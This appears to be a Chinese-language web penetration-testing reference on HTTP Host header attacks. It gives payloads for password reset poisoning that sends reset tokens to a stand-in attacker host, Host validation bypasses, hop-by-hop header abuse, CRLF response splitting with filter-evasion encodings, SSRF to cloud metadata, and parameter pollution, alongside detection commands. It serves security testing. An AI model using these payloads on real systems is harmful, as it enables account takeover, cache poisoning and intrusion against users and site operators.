# HTTP Host 头攻击专题

> 密码重置投毒、校验绕过全集、hop-by-hop 滥用、CRLF 进阶、HPP 取值差异。
> 基础速查见 web-vulnerabilities.md §6.2；缓存投毒详见 cache-poisoning.md。

---

## 1. 攻击面

| Host 用途 | 利用 |
|---|---|
| URL 生成（重置邮件链接） | 注入攻击者域 → 密码重置投毒 |
| vhost 路由 | 访问 admin./staging./localhost 内部 vhost |
| 缓存键组件 | 缓存不含 Host 时投毒全用户 |
| 反代路由（$host） | SSRF 直达内部服务/云元数据 |
| 访问控制 | Host ACL 绕过 |
| 规范重定向 | 开放重定向 |

**密码重置投毒**（最常见）：`POST /forgot-password` + `Host: attacker-collaborator.net` + `email=victim@target.com` → 重置链接 `https://attacker.com/reset?token=SECRET` → 受害者点击 token 落攻击者服务器。**无需受害者登录**。变体：拼接 `target.com.attacker.com`；`target.com:@attacker.com`（URL 解析取 @ 后）。

**缓存投毒**：缓存键不含 Host + 应用把 Host 写进响应 → 全用户中毒。多数 CDN 含 Host，自建 Varnish/Nginx 可能不含。

**vhost 枚举**：`ffuf -u http://IP -H "Host: FUZZ.target.com" -w vhosts.txt`；试 localhost/admin/staging/internal，对比响应差异。

## 2. 校验绕过全集

1. **覆盖头**（同时全发）：`X-Forwarded-Host`（Symfony/Laravel/Django+USE_X_FORWARDED_HOST/Rails——**头号遗漏**）｜`X-Host`｜`X-Original-URL`/`X-Rewrite-URL`（IIS+URL Rewrite）｜`Forwarded: host=`（RFC 7239）｜`X-Forwarded-Server`
2. **请求行绝对 URI**：`GET http://attacker.com/path HTTP/1.1` + Host: target.com（RFC 7230 说此时忽略 Host，实现分歧）
3. **双 Host**：代理校验第一个、应用用第二个；或拼接 `,`；RFC 说应 400 但几乎无人实现
4. **URL 解析混淆**：`target.com:@attacker.com`｜`target.com:evil.com`｜`target.com#@attacker.com`｜`attacker.com%23@target.com`
5. **尾点**：`target.com.`——DNS 等价、字符串校验不等
6. **TAB/空格**：`target.com\tattacker.com`——校验看前段、解析取后段
7. **包裹值**：`"attacker.com"`/`<attacker.com>`——一侧剥一侧不剥
8. **连接状态攻击**：keep-alive 首请求合法 Host 过校验、同连接第二请求恶意 Host（部分代理只校验首请求）。Burp Repeater 保连接手测
9. **DNS 组合**：自己域名 A 记录指向目标 IP → Host 是你的域、请求打他们服务器 → 绕 IP 控制

**框架差异**：PHP `$_SERVER['HTTP_HOST']` 直接可注入（SERVER_NAME 仅 UseCanonicalName On 安全）｜Django `USE_X_FORWARDED_HOST=True` 绕 ALLOWED_HOSTS｜Rails 6+ HostAuthorization 缓解｜Express 无内建校验。

## 3. Hop-by-Hop 滥用

`Connection` 头声明逐跳头，代理转发前移除：

```http
GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1
Connection: close, X-Forwarded-For
```
代理剥 XFF → 后端回退信任直连 IP → **绕 IP 白名单**。

```http
GET /profile HTTP/1.1
Connection: close, Cookie
Cookie: session=attacker_session
```
缓存代理剥 Cookie 后缓存攻击者会话页面 → **缓存投毒**。检测：带/不带 hop-by-hop 声明两连发对比差异。

## 4. CRLF 进阶与 HPP

**CRLF**（Host 反射进响应头时）：注入头 `Host: target.com%0d%0aSet-Cookie:%20admin=true`｜**响应拆分**：双 CRLF 伪造完整响应体（`Content-Length:0` 截断原响应 + 新 `HTTP/1.1 200 OK` + `<script>`）｜**缓存投毒**：可缓存端点 CRLF 注入 `X-Forwarded-Host: evil.com`｜**WAF 滤 %0d%0a 的 Unicode 换行**：`%E5%98%8A%E5%98%8D`（U+560A/U+560D）、`%E2%80%A8`（U+2028）、`%C2%85`（U+0085）。同族候选 `瘍瘊`（U+760D/U+760A，UTF-8 \xe7\x98\x8d\xe7\x98\x8a）——Java 后端 char 窄化场景下还可触发 SMTP 注入/HttpClient 走私/JDK HttpServer 响应拆分（CVE-2026-21933），系统性变体见 `ghost-bits-cast-attack.md` §4.5。检测 `curl -s -D- "...%0d%0aSet-Cookie:%20test=crlf" | grep Set-Cookie`；批量 crlfuzz。

**HPP 同名参数取值**（OWASP WSTG 权威矩阵，2026-08 核验修正——注意 ASP.NET 才是逗号拼接，Tomcat/Servlet 是 first）：
| 栈 | a=1&a=2 |
|---|---|
| ASP.NET/IIS | 逗号拼接 `a=1,2` |
| PHP/Apache、Django、Rack | last |
| JSP/Servlet/Tomcat/Jetty、Flask、Go、Perl、Ruby WEBrick | first |
| Express 4.x（qs） | 数组 `['1','2']`（String 强转变 `1,2`；版本差异实测） |

**SSPP**：`name=peter%26role=admin`——后端解码 `&` 注入内部 API 参数。

**HPP 测试法**：全链路建模（browser→WAF→proxy→框架→业务）逐跳判 first/last/join；双向序 `a=1&a=2` 和 `a=2&a=1` 都发；multipart 用两个同名 part；JSON 测重复键（多数取 last）。模式：`id[]=1&id[]=2`（数组式）｜`user[role]=user&user[role]=admin`（嵌套括号）｜`param=v1%26other=v2`（编码 & 差异）。场景：WAF 查 first/应用用 last（`id=1&id=1 UNION...`）｜SSRF 双 URL（`url=legit&url=169.254.169.254`）｜CSRF token 重复混淆｜支付逻辑 `amount=1&amount=5000`。OWASP 准则：只取 first/last 且单输入校验充分→无洞；拼接/组件间取值不一致/报错→可利用。

**HPP 场景补充**：会话固定 `?url=%0D%0ASet-Cookie:PHPSESSID=attacker_id`（受害者用攻击者会话登录后劫持）｜日志注入 UA/Referer 伪造条目（污染审计/SIEM）｜302 Location 劫持 `%0D%0ALocation:http://evil.com`（部分服务器取 last Location）。绕过：单 `%0A`（LF-only）｜双重编码 `%250D%250A`｜滤值时注入参数名。易感指纹：用户输入未剥 CRLF 直接进 `header()/setHeader()/redirect()`（PHP<5.1.2 header() 不过滤）。

**组合**：Host+CRLF 拆分｜HPP+Host 双写绕 ACL｜Hop-by-Hop 剥原 X-Forwarded-Host 留注入值｜CRLF+缓存控制头扩大投毒。
